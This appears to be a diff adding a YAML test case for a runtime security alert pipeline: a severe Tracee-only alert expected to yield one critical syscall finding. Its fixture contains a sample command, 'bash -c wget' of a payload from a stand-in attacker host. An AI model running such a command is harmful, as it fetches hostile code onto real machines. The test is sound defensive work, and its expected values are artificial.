@@ -1,0 +1,29 @@
+case_id: 006_tracee_only_severe
+description: Tracee-only severity-3 alert with no Falco coverage — CRITICAL RUNTIME_SYSCALL
+fixture:
+  falco_alerts: []
+  tracee_alerts:
+    - timestamp: 1715414400000000000
+      event_name: sched_process_exec
+      process_name: bash
+      process_id: 5555
+      host_name: ip-10-0-2-99
+      container_image: ''
+      container_id: ''
+      args:
+        cmdline: /bin/bash -c 'wget evil.example.com/payload'
+      severity: 3
+      description: Suspicious process execution on bare-metal host
+      pod_name: ''
+      namespace: ''
+  osquery_rows: []
+expected:
+  finding_count: 1
+  by_severity:
+    critical: 1
+  by_finding_type:
+    runtime_syscall: 1
+    runtime_file: 0
+    runtime_network: 0
+    runtime_process: 0
+    runtime_osquery: 0
